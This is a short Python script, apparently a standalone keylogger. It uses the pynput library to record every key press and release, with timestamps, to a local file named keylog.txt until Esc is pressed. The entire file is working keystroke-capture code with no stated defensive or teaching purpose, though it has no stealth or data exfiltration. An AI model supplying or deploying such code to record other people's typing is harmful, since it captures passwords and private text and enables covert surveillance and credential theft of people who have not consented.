from pynput import keyboard 
import datetime 
logfile="keylog.txt"

def log_key(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(logfile , "a") as f:
        f.write(f"[{timestamp}] {key}\n ")

def on_press(key):
    try:
        log_key("key {0} pressed " .format(key.char))
    except AttributeError:
        log_key('special key {0} pressed ' .format(key))

def on_release(key):
    log_key('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop the  listener
        return False

# Collect of events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()